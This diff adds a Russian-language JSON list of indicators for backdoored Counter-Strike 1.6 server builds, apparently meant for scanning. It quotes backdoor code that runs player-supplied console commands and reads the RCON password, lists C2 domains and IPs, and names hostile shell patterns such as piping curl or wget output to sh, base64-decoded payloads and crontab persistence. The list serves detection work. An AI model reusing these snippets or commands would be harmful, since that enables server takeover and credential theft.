@@ -1,0 +1,532 @@
+{
+  "version": 1,
+  "collected": "2026-08-04",
+  "note": "Индикаторы закладок в сборках CS 1.6, собранные разведкой с указанием источников.",
+  "indicators": [
+    {
+      "kind": "amxx_native",
+      "pattern": "server_cmd",
+      "severity": "critical",
+      "why": "Выполняет ЛЮБУЮ команду серверной консоли из плагина. Базовый примитив почти всех бэкдоров: server_cmd(\"amx_addadmin ...\"), server_cmd(\"rcon_password ...\"), server_cmd(\"exec backdoor.cfg\"), server_cmd(\"quit\"). Сам по себе легитимен и встречается в нормальных плагинах — тревожен КОНТЕКСТ: строка команды приходит из read_argv/чата/сети, либо форматируется как server_cmd(\"%s\", arg).",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "server_cmd(\"%s\"",
+      "severity": "critical",
+      "why": "Классическая сигнатура «команда-из-аргумента». Реальный пример (sekys/cs-amxpackage, hud.sma): register_clcmd(\"seky\",\"backdoor\",ADMIN_ALL,\"#echo\") → read_argv(1,arg,6); if(equal(arg,\"423789\")) { read_argv(2,arg2,512); server_cmd(\"%s\",arg2); } — полноценный удалённый RCE-канал, доступный любому игроку (ADMIN_ALL), защищённый только паролем-числом.",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "server_exec",
+      "severity": "high",
+      "why": "Форсирует немедленное исполнение очереди server_cmd. В бэкдорах ставится сразу после server_cmd, чтобы команда отработала до того, как её успеют перехватить/залогировать, и до смены карты.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/server_exec"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "get_cvar_string(\"rcon_password\"",
+      "severity": "critical",
+      "why": "Прямое чтение RCON-пароля. rcon_password помечен FCVAR_PROTECTED (в ответе A2S_RULES отдаётся как ***PROTECTED***), но ВНУТРИ плагина get_cvar_string/get_pcvar_string возвращают открытый текст. Дальше пароль уходит по сокету, в MOTD, в имя хоста или в публичную cvar. Искать также get_pcvar_string + get_cvar_pointer(\"rcon_password\").",
+      "source_url": "https://amxmodmenu.ru/shield/913-zashhita-rcon-parolya.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "rcon",
+      "severity": "critical",
+      "why": "Первый и главный греп по декомпилированному .amxx/.sma. Любое упоминание rcon в плагине, который не является админ-панелью, — повод считать его вредоносным. Рекомендация из русскоязычного разбора: «rcon — крадёт RCON пароль сервера».",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "set_cvar_string(\"rcon_password\"",
+      "severity": "critical",
+      "why": "Смена RCON-пароля из плагина = молчаливый захват сервера (владелец теряет доступ, атакующий получает). Так же ищи server_cmd(\"rcon_password %s\") и set_pcvar_string по указателю на rcon_password.",
+      "source_url": "https://amxx.pl/topic/114275-raiz0s-rcon-hack-fix/"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "set_user_flags",
+      "severity": "critical",
+      "why": "Выдача админ-прав в рантайме, минуя users.ini. Каноничный бэкдор: get_user_authid(id,...) → сравнение с зашитым STEAM_0:... → set_user_flags(id, read_flags(\"abcdefghijklmnopqrstu\")). Права не видны ни в users.ini, ни в веб-панели. В разборе прямо назван как «появляются неизвестные админы».",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "abcdefghijklmnopqrstu",
+      "severity": "critical",
+      "why": "Строка «все флаги доступа» AMX Mod X (a=immunity … u=menu; см. amxconst.inc). В коде плагина или в users.ini рядом с незнакомым SteamID/IP это гарантированный скрытый суперадмин. Варианты для грепа: abcdefghijklmnopqrstuv, abcdefghijklmnopqrstuvwxyz, read_flags(\"abcdefghijklmnopqrstu\").",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/plugins/include/amxconst.inc"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "ADMIN_RCON",
+      "severity": "high",
+      "why": "Флаг \"l\" (1<<11). Команды amx_rcon и amx_showrcon требуют именно его. Плагин, самостоятельно выдающий ADMIN_RCON, или конфиг cmdaccess.ini, понижающий требование для amx_rcon, — прямой путь к выполнению rcon-команд игроком.",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/plugins/admincmd.sma"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "amx_addadmin",
+      "severity": "high",
+      "why": "Команда добавления админа с записью в users.ini. В логах взломанных серверов встречается как amx_addadmin \"STEAM_0:0:718437961\" \"abcdefghijklmnopqrstu\". Внутри плагина (через server_cmd) — бэкдор; в логах/конфигах — след состоявшегося взлома.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "get_user_authid",
+      "severity": "high",
+      "why": "Сам по себе легитимен, но в связке со сравнением на зашитый STEAM_0:X:YYYY и последующим set_user_flags/server_cmd — сигнатура «привилегия по SteamID автора сборки». Грепать пары: get_user_authid + equal(...,\"STEAM_0:\") + set_user_flags.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/get_user_authid"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "STEAM_0:0:11696626",
+      "severity": "high",
+      "why": "Зашитый SteamID из подтверждённого бэкдора AMX Mod 2010.1 (функция is_dev_authid, посимвольная сверка в бинарнике). Второй ID: STEAM_0:0:13923116. Если такие ID встречаются в .amxx/.so/.dll вашей сборки — сборка тянет заражённый AMX Mod.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "is_dev_authid",
+      "severity": "high",
+      "why": "Имя функции-аутентификатора бэкдора в бинарниках AMX Mod 2010.1 с amxmod.net. Проверяла SteamID подключившегося символ за символом (чтобы не палиться на цельной строке) и открывала скрытые команды.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "mrp",
+      "severity": "critical",
+      "why": "Скрытая команда бэкдора AMX Mod 2010.1: получить/сменить RCON-пароль сервера. Грепать вместе с соседями: cmdr (выполнить произвольную консольную команду на сервере), cmdc (выполнить команду на указанном клиенте), slog (полностью отключить логирование). Четыре коротких строки — самая ценная сигнатура для бинарного грепа по amxmod_mm_i386.so / amxmod_mm.dll.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "cmdr",
+      "severity": "critical",
+      "why": "Скрытая команда AMX Mod 2010.1 backdoor — выполнение произвольных консольных команд на сервере от имени «разработчика». Ищется в бинарнике модуля, не в .amxx.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "cmdc",
+      "severity": "critical",
+      "why": "Скрытая команда AMX Mod 2010.1 backdoor — выполнение произвольной команды на указанном КЛИЕНТЕ (заставить игрока выполнить connect/exec/quit).",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "slog",
+      "severity": "high",
+      "why": "Скрытая команда AMX Mod 2010.1 backdoor — полное отключение логирования сервера, антифорензика перед атакой.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "client_cmd",
+      "severity": "high",
+      "why": "Выполнение команды на клиенте игрока. В бэкдорах: client_cmd(id,\"connect 1.2.3.4:27015\") — угон игроков на чужой сервер; client_cmd(id,\"bind F2 connect IP\") — угон отложенный; client_cmd(id,\"exec ...\"), client_cmd(0,\"...\") на всех. Смотреть также engclient_cmd, console_cmd, amxclient_cmd — те же возможности другими именами.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "connect ",
+      "severity": "high",
+      "why": "В плагине, который не является легитимным редиректом, строка connect + IP:порт = угон трафика. Реальные примеры из списка заражённых плагинов: connect 46.174.52.11:27259, connect 46.174.50.24:27217, connect 188.230.69.69:27017, connect 95.47.161.115:27037.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "bind ",
+      "severity": "high",
+      "why": "Сам bind безобиден (bind F3 menu), опасна связка bind + connect/say. Задокументированные заражённые плагины: voteban1_2.amxx (bind F2 connect 46.174.52.11:27259), reset_score.amxx (bind F2 connect 46.174.50.24:27217), nice_loading_music.amxx (bind [ connect 188.230.69.69:27017), parachute.amx и resetscore.amxx и kills_counter.amxx (connect 95.47.161.115:27037). Игрок жмёт клавишу через неделю и уходит на чужой сервер.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "motd_write",
+      "severity": "high",
+      "why": "Консольная команда HLDS для записи MOTD. В заражённых плагинах используется как редирект/реклама: online_play.amxx — motd_write Connect 46.38.62.71:27777; nademessages.amxx — motd_write Connect hl.csgoogle.ru:27115 (домен из ботнета Belonard). Грепать по motd_write и по show_motd с http://.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "show_motd",
+      "severity": "medium",
+      "why": "Показывает игроку HTML-окно, встроенное в клиент (движок IE на Windows). show_motd(id,\"http://внешний-хост/...\") = принудительная загрузка чужой веб-страницы в клиент игрока: реклама, редирект, потенциально drive-by. Опасен только с внешним URL — грепать show_motd в паре с http.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/show_motd"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "message_begin",
+      "severity": "high",
+      "why": "ОБХОД грепа по client_cmd. message_begin(MSG_ONE, 9 /*SVC_STUFFTEXT*/, ...) + write_string(\"connect IP\\n\") + message_end() заставляет клиент выполнить консольную команду, не вызывая client_cmd. Грепать: message_begin/emessage_begin с числовым msgid 9 и SVC_STUFFTEXT, а также write_string со строками, начинающимися на connect/bind/exec.",
+      "source_url": "https://github.com/alliedmodders/amxmodx/blob/master/plugins/include/message_const.inc"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "SVC_STUFFTEXT",
+      "severity": "high",
+      "why": "Константа = 9. Механизм «сервер заставляет клиента выполнить команду». Именно им (вместе с svc_resourcelist/svc_resourcerequest) вредоносные серверы CS 1.6 заражали игроков. В обычном игровом плагине не нужен.",
+      "source_url": "https://github.com/ValveSoftware/halflife/issues/2063"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "socket_open",
+      "severity": "critical",
+      "why": "Модуль Sockets — произвольное TCP/UDP-соединение наружу из плагина. Канал эксфильтрации RCON-пароля, users.ini, конфигов и канал приёма команд (C2). Грепать всю семью: socket_open, socket_send, socket_send2, socket_recv, socket_close, socket_is_readable, socket_is_writable. В геймплейном плагине (ZP-режим, оружие, магазин) сокеты не нужны никогда.",
+      "source_url": "https://www.amxmodx.org/api/sockets/socket_open"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "sockets",
+      "severity": "high",
+      "why": "Строка подключения модуля (#include <sockets>) и его включение в addons/amxmodx/configs/modules.ini. Проверять, включён ли sockets_amxx_i386.so в modules.ini, и какой плагин его требует. По умолчанию геймплейным сборкам он не нужен.",
+      "source_url": "https://www.amxmodx.org/api/sockets/socket_open"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "fopen",
+      "severity": "high",
+      "why": "Файловые нативы дают плагину чтение/запись в ЛЮБОЙ файл в пределах прав процесса hlds. Классика: чтение addons/amxmodx/configs/users.ini и server.cfg с последующей отправкой (в разборе описано как «крадёт файлы сервера и отправляет по EMAIL»). На Linux-хостинге через ../ достижимы ~/.ssh, конфиги веб-панели, .my.cnf. Грепать: fopen, fread, fgets, fprintf, fputs, fclose, read_file, write_file, delete_file, unlink, rename_file, build_pathname.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "stmp",
+      "severity": "high",
+      "why": "Строка, названная в русскоязычном разборе бэкдоров как признак «крадёт файлы сервера (users.ini, server.cfg и т.д.) и отправляет по EMAIL». Грепать оба написания: stmp и smtp, а также mail, MAIL FROM, RCPT TO, HELO, порт 25/587 в socket_open.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "users.ini",
+      "severity": "high",
+      "why": "Упоминание файла админов внутри игрового плагина — либо кража списка админов/паролей, либо тихая дописка своей строки. Легитимные плагины работают через API (get_user_flags), а не читают users.ini напрямую.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "plugin_cfg",
+      "severity": "medium",
+      "why": "Forward, вызываемый ПОСЛЕ выполнения server.cfg — то есть в момент, когда rcon_password уже установлен. Любимая точка входа для «сбора» пароля. Подозрительно, когда plugin_cfg() у геймплейного плагина читает cvar-ы, открывает сокеты или пишет файлы.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/server_exec"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "set_task",
+      "severity": "medium",
+      "why": "Отложенный/повторяющийся запуск. В бэкдорах — таймер активации, чтобы вредонос не сработал при первичной проверке: set_task(300.0,\"exploit\",_,_,_,\"b\") (флаг \"b\" = бесконечное повторение). Смотреть, ЧТО именно вызывается по таймеру.",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "get_cvar_string(\"rcon_password\", exploit",
+      "severity": "high",
+      "why": "Пример «плагина-заложника»: get_cvar_string(\"rcon_password\", exploit, 24); if(!equal(exploit,\"csleg2\")) { server_cmd(\"quit\"); server_cmd(\"exit\"); } — плагин глушит сервер, если RCON-пароль не совпадает с зашитым. Тот же приём (проверка hostname/IP/rcon + quit) используется в «привязанных» и «лицензионных» плагинах русских сборок; заодно он читает rcon в открытом виде.",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "logaddress_add",
+      "severity": "high",
+      "why": "Консольная команда HLDS, включающая пересылку ВСЕХ логов сервера по UDP на указанный хост:порт. В логи попадают rcon-команды и админские действия. Один вызов server_cmd(\"logaddress_add IP порт\") или строка в server.cfg = постоянная эксфильтрация. Проверять также logaddress и log on/off рядом.",
+      "source_url": "https://wiki.hldm.org/Server.cfg"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "log off",
+      "severity": "high",
+      "why": "Отключение логирования сервера. В логах реальных взломов идёт сразу после amx_addadmin — антифорензика. В коде плагина (server_cmd(\"log off\") / set_cvar_num(\"log\",0)) — однозначный вредонос.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "register_clcmd",
+      "severity": "medium",
+      "why": "Сама по себе штатная. Опасна регистрация «бессмысленных» команд, не относящихся к геймплею: register_clcmd(\"seky\",\"backdoor\",ADMIN_ALL,\"#echo\") — команда-люк с уровнем доступа ADMIN_ALL (то есть для всех) и скрытым описанием \"#echo\", чтобы не отображаться в списках. Проверять флаг ADMIN_ALL у команд, ведущих в server_cmd/set_user_flags.",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "register_srvcmd",
+      "severity": "medium",
+      "why": "Регистрация серверной команды: даёт бэкдору вход через любой канал, где можно выполнить команду сервера (rcon, cfg, другой плагин). Сверять список зарегистрированных команд с ожидаемым функционалом плагина командой amxx cmds в консоли сервера.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "read_argv",
+      "severity": "medium",
+      "why": "Чтение аргумента команды. Сигнатура бэкдора — read_argv, результат которого без валидации уходит в server_cmd/client_cmd, с предварительной сверкой первого аргумента с зашитым паролем (например \"423789\").",
+      "source_url": "https://raw.githubusercontent.com/sekys/cs-amxpackage/master/hud.sma"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "callfunc_begin",
+      "severity": "medium",
+      "why": "Косвенный вызов функций по ИМЕНИ-строке (callfunc_begin/callfunc_push_str/callfunc_end, get_func_id). Позволяет спрятать цель вызова от статического анализа и дёргать нативы чужих плагинов. Смотреть также register_native/get_native — плагин может получать опасную функциональность от соседнего «безобидного» плагина.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/register_native"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "query_client_cvar",
+      "severity": "medium",
+      "why": "Позволяет серверу читать значения cvar-ов на клиенте (в т.ч. приватные setinfo-поля, включая пароль админа в поле _pw, если он передаётся). В геймплейном плагине без античит-функции не нужен.",
+      "source_url": "https://www.amxmodx.org/api/amxmodx/get_user_authid"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "_pw",
+      "severity": "medium",
+      "why": "Значение amx_password_field по умолчанию — setinfo-поле, где хранится пароль админа на клиенте. Плагин, читающий это поле (get_user_info/query_client_cvar с _pw), крадёт админские пароли. В amxx.cfg это поле рекомендуется переименовывать.",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/configs/amxx.cfg"
+    },
+    {
+      "kind": "amxx_native",
+      "pattern": "precache_generic",
+      "severity": "critical",
+      "why": "Добавляет файл в resource list, который клиент обязан скачать. Именно через resource list + FastDL вредоносные серверы CS 1.6 подсовывали игрокам Mp3enc.asi / Mssv24.asi / client.dll (файлы .asi автозагружаются игрой из корня Half-Life). precache_generic с расширениями .asi/.dll/.exe/.sav или файл вне sound/models/sprites — критично.",
+      "source_url": "https://github.com/ValveSoftware/halflife/issues/2063"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": ".asi",
+      "severity": "critical",
+      "why": "Расширение плагинов-библиотек, автоматически подгружаемых клиентом Half-Life из корня игры. Ключевой носитель заражения в кампании Belonard. Наличие .asi-файлов в раздаче сервера или в списке ресурсов = сборка заражает ваших игроков. Конкретные имена: Mp3enc.asi, Mssv24.asi, Mssv16.asi.",
+      "source_url": "https://news.drweb.com/show/?i=13135&lng=en"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "csgoogle.ru",
+      "severity": "critical",
+      "why": "Домен C2/редиректа ботнета Belonard. Уже встречался ВНУТРИ бэкдоренного AMXX-плагина (nademessages.amxx: motd_write Connect hl.csgoogle.ru:27115). Грепать вместе с valve-ms.ru и поддоменами вида *.valve-ms.ru:28445, а также IP 37.143.12.3 и 46.254.17.165.",
+      "source_url": "https://news.drweb.com/show/?i=13135&lng=en"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "valve-ms.ru",
+      "severity": "critical",
+      "why": "Второй C2-домен Belonard. Любое упоминание в плагинах, конфигах, motd.txt, sv_downloadurl или в бинарниках сборки — сборка часть/наследник ботнета.",
+      "source_url": "https://news.drweb.com/show/?i=13135&lng=en"
+    },
+    {
+      "kind": "config",
+      "pattern": "amx_default_access",
+      "severity": "critical",
+      "why": "В amxx.cfg штатное значение \"z\" (обычный игрок). Любое другое значение раздаёт указанные флаги ВСЕМ подключившимся. Строка amx_default_access \"abcdefghijklmnopqrstu\" (или даже \"l\") — однострочный бэкдор уровня конфига, который не требует ни одного вредоносного плагина.",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/configs/amxx.cfg"
+    },
+    {
+      "kind": "config",
+      "pattern": "amx_mode 0",
+      "severity": "medium",
+      "why": "Отключает проверку игроков и назначение доступа/логирование входа админов. Используется, чтобы скрыть работу альтернативной (плагинной) системы прав — то есть скрытых админов.",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/configs/amxx.cfg"
+    },
+    {
+      "kind": "config",
+      "pattern": "\" \"abcdefghijklmnopqrstu\" \"e\"",
+      "severity": "critical",
+      "why": "Запись в users.ini с флагом аккаунта \"e\" = «пароль не проверяется, достаточно ника/IP/SteamID». В связке с \"d\" (это IP) или пустым/подставным ником даёт вход админом без пароля. Проверять каждую строку users.ini: 4-е поле — флаги аккаунта (a — кик при неверном пароле, b — клан-тег, c — SteamID, d — IP, e — без пароля, k — регистрозависимость).",
+      "source_url": "https://raw.githubusercontent.com/alliedmodders/amxmodx/master/configs/users.ini"
+    },
+    {
+      "kind": "config",
+      "pattern": "cmdaccess.ini",
+      "severity": "high",
+      "why": "Файл переопределения требуемых флагов для команд. Строка, привязывающая amx_rcon / amx_cvar / amx_addadmin к низкому флагу (например \"z\" или ADMIN_ALL), открывает эти команды обычным игрокам. Сверять с дефолтом: amx_rcon и amx_showrcon = ADMIN_RCON (l), amx_cvar = ADMIN_CVAR (g), amx_cfg = ADMIN_CFG (h).",
+      "source_url": "https://github.com/kriansa/cs-16-server/blob/master/cstrike/addons/amxmodx/configs/cmdaccess.ini"
+    },
+    {
+      "kind": "config",
+      "pattern": "exec ",
+      "severity": "high",
+      "why": "В server.cfg / autoexec.cfg / amxx.cfg строка exec с непонятным именем файла (что-то вроде exec update.cfg, exec sv.cfg, exec cache.cfg) — типовой способ вынести вредоносные команды в файл, который никто не открывает. Проверять ВСЕ .cfg в cstrike/ и cstrike/addons/amxmodx/configs/, включая те, на которые ссылаются exec.",
+      "source_url": "https://wiki.hldm.org/Server.cfg"
+    },
+    {
+      "kind": "config",
+      "pattern": "cstrike/maps/*.cfg",
+      "severity": "high",
+      "why": "HLDS автоматически выполняет maps/<имя_карты>.cfg при загрузке карты. Идеальный тайник: команды (amx_addadmin, rcon_password, logaddress_add) срабатывают не сразу, а только на конкретной карте — при первичном осмотре сборки не видны. Для ZP-сборок карт много, проверять надо все.",
+      "source_url": "https://wiki.hldm.org/Server.cfg"
+    },
+    {
+      "kind": "config",
+      "pattern": "sv_downloadurl",
+      "severity": "high",
+      "why": "FastDL-адрес, с которого клиенты качают ресурсы. Указывающий на чужой/незнакомый хост — механизм доставки вредоносных файлов игрокам (в разборе Valve-issue: http://jgutdnqn.cs****.ru/fastdl/ раздавал .asi и client.dll). Проверять домен, HTTPS и принадлежность.",
+      "source_url": "https://github.com/ValveSoftware/halflife/issues/2063"
+    },
+    {
+      "kind": "config",
+      "pattern": "motd.txt",
+      "severity": "medium",
+      "why": "MOTD рендерится встроенным браузером клиента. <script>, <iframe>, <meta refresh> или ссылка на внешний хост в cstrike/motd.txt — реклама/редирект/потенциальный drive-by по игрокам. Грепать motd.txt и motdfile на http, iframe, script.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "config",
+      "pattern": "addons/metamod/plugins.ini",
+      "severity": "critical",
+      "why": "Список нативных .so-библиотек, загружаемых Metamod с полными правами процесса hlds — обход всей песочницы AMXX. Любая строка, кроме ожидаемых (amxmodx_mm_i386.so, dproto/reunion, yapb/podbot, vtc), требует проверки. Аналогично addons/amxmodx/configs/modules.ini — включённые модули (особенно sockets, curl, самописные) дают плагинам сеть и файловый доступ.",
+      "source_url": "http://www.amxmodx.org/doc/source/modules/modules.htm"
+    },
+    {
+      "kind": "config",
+      "pattern": "liblist.gam",
+      "severity": "critical",
+      "why": "Определяет gamedll/gamedll_linux. Если путь ведёт не на addons/metamod/dlls/metamod_i386.so (или штатный dlls/cs.so), а на постороннюю библиотеку — подменена вся серверная игровая логика. Также в liblist.gam правится флаг secure/VAC.",
+      "source_url": "https://steamcommunity.com/sharedfiles/filedetails/?id=195234043"
+    },
+    {
+      "kind": "binary",
+      "pattern": "amxmod_mm_i386.so",
+      "severity": "critical",
+      "why": "Бинарник AMX Mod (НЕ AMX Mod X) из раздачи amxmod.net версии 2010.1 — подтверждённо содержал бэкдор с зашитыми SteamID и скрытыми командами mrp/cmdr/cmdc/slog. Если сборка тянет AMX Mod вместо AMX Mod X — выбрасывать целиком. Windows-аналог: amxmod_mm.dll.",
+      "source_url": "https://amxx.pl/topic/152153-security-advisory-regarding-amx-mod-20101/"
+    },
+    {
+      "kind": "binary",
+      "pattern": "cs.so / engine_i686.so / swds.dll / mp.dll",
+      "severity": "critical",
+      "why": "Игровые/движковые бинарники. В сборках их регулярно подменяют (исторически — для обхода проверок CD-Key/IP в swds.dll), а значит подменить можно на что угодно. Проверка: сверять sha256 с чистой раздачей из SteamCMD / официальных релизов ReHLDS+ReGameDLL; любые лишние .so/.dll в cstrike/dlls, cstrike/addons и корне сервера — под подозрение.",
+      "source_url": "https://github.com/rehlds/ReGameDLL_CS"
+    },
+    {
+      "kind": "binary",
+      "pattern": "strings: /bin/sh, system, popen, execve, wget, curl, nc, /dev/tcp",
+      "severity": "critical",
+      "why": "У AMXX-плагина (.amxx) нет нативов запуска shell — но у нативного модуля/Metamod-плагина (.so) они есть. Наличие этих строк в любом .so из addons — прямой признак закладки уровня ОС. Дополнительно проверять: LD_PRELOAD, dlopen, /tmp/, .ssh/authorized_keys, crontab.",
+      "source_url": "http://www.amxmodx.org/doc/source/modules/modules.htm"
+    },
+    {
+      "kind": "script",
+      "pattern": "LD_PRELOAD",
+      "severity": "critical",
+      "why": "В hlds_run / run.sh / start.sh строка с LD_PRELOAD подгружает произвольную библиотеку в процесс сервера ещё до Metamod — полный контроль, невидимый для любых проверок плагинов. Штатный hlds_run использует LD_LIBRARY_PATH; LD_PRELOAD там быть не должно.",
+      "source_url": "https://steamcommunity.com/sharedfiles/filedetails/?id=1837127329"
+    },
+    {
+      "kind": "script",
+      "pattern": "curl | sh",
+      "severity": "critical",
+      "why": "Загрузка и исполнение кода с внешнего хоста в скриптах установки/запуска сборки. Грепать варианты: curl -s ... | sh, curl ... | bash, wget -qO- ... | sh, wget -O /tmp/..., eval $(curl ...). В скриптах запуска CS 1.6 сети быть не должно вообще.",
+      "source_url": "https://steamcommunity.com/sharedfiles/filedetails/?id=1837127329"
+    },
+    {
+      "kind": "script",
+      "pattern": "base64 -d",
+      "severity": "critical",
+      "why": "Обфускация команды в стартовом скрипте: echo <blob> | base64 -d | sh (варианты: openssl enc -d, xxd -r -p, printf с \\x-escape). Легитимные скрипты запуска hlds так не делают.",
+      "source_url": "https://steamcommunity.com/sharedfiles/filedetails/?id=1837127329"
+    },
+    {
+      "kind": "script",
+      "pattern": "crontab",
+      "severity": "high",
+      "why": "Установщик/скрипт запуска сборки, добавляющий задачу в crontab (crontab -, @reboot, /etc/cron.d/) — механизм персистентности, переживающий переустановку сервера. Проверять также systemd-юниты, ~/.bashrc, ~/.profile, ~/.ssh/authorized_keys после распаковки сборки.",
+      "source_url": "https://steamcommunity.com/sharedfiles/filedetails/?id=1837127329"
+    },
+    {
+      "kind": "filename",
+      "pattern": "*.amxx без парного *.sma",
+      "severity": "high",
+      "why": "Главное операционное правило комьюнити: не ставить плагин без исходника и ПЕРЕСОБИРАТЬ его самостоятельно — бэкдор часто дописан только в скомпилированный .amxx, а приложенный .sma чистый. Сверять список файлов plugins/*.amxx со списком scripting/*.sma и перекомпилировать всё, что не совпадает.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "filename",
+      "pattern": "voteban1_2.amxx",
+      "severity": "high",
+      "why": "Из опубликованного списка заражённых плагинов (bind F2 connect 46.174.52.11:27259). Полный список известных имён для чёрного списка: voteban1_2.amxx, reset_score.amxx, resetscore.amxx, nice_loading_music.amxx, parachute.amx, kills_counter.amxx, online_play.amxx, nademessages.amxx, virus.amxx, fuckoff.amxx, amx_sysbizz.amxx, truebans_core.amxx. Имена могут быть переименованы — сверять и по содержимому.",
+      "source_url": "https://c-s.net.ua/forum/topic81675.html"
+    },
+    {
+      "kind": "filename",
+      "pattern": "statsx_gui.amxx",
+      "severity": "medium",
+      "why": "Плагины статистики (statsx_gui, statsx_shell и их «шеллы») неоднократно назывались на форумах носителями бэкдоров при разборе повторных взломов серверов. Не подтверждено централизованным advisory, но в ZP-сборках статистика присутствует почти всегда — проверять в первую очередь. Там же фигурировал PlayersCountSelectTeam.amxx.",
+      "source_url": "https://forum.myarena.ru/index.php?%2Ftopic%2F33694-vzlamyvaiut-server-pomogite-vyiavit-plagin-s-la%2F="
+    },
+    {
+      "kind": "filename",
+      "pattern": "fg_keys.ini",
+      "severity": "medium",
+      "why": "Файл лицензионных ключей платных плагинов (addons/amxmodx/data/fg_keys.ini). Не вредонос сам по себе, но маркер: в сборке есть плагины, которые ходят наружу за проверкой лицензии/привязки к IP. Такие «фонящие» плагины — готовый канал управления и первое, что надо изолировать firewall-ом и проверить на socket_open/http.",
+      "source_url": "https://fungun.net/shop/?p=notwork"
+    },
+    {
+      "kind": "config",
+      "pattern": "addons/amxmodx/configs/orpheu/",
+      "severity": "medium",
+      "why": "Модуль Orpheu позволяет перехватывать и подменять функции самого движка (используется легитимно, например в rcon_defencer для перехвата SV_Rcon_Validate). В руках закладки — способ незаметно подменить проверку RCON или скрыть команды. Наличие каталога orpheu и его сигнатур требует ручного разбора: какая функция и каким плагином хукается.",
+      "source_url": "https://amxmodmenu.ru/shield/913-zashhita-rcon-parolya.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "noredirect",
+      "severity": "low",
+      "why": "Задокументированный «безобидный» бэкдор в популярном плагине редиректа: игрок с ником noredirect и иммунитетом не редиректится. Иллюстрирует общий класс: доступ по совпадению НИКА. Грепать get_user_name/equali в связке с зашитой строкой-ником.",
+      "source_url": "http://csserversglobal.blogspot.com/2015/05/cs-16-server-amxx-auto-redirect.html"
+    },
+    {
+      "kind": "amxx_string",
+      "pattern": "amxx cmds",
+      "severity": "low",
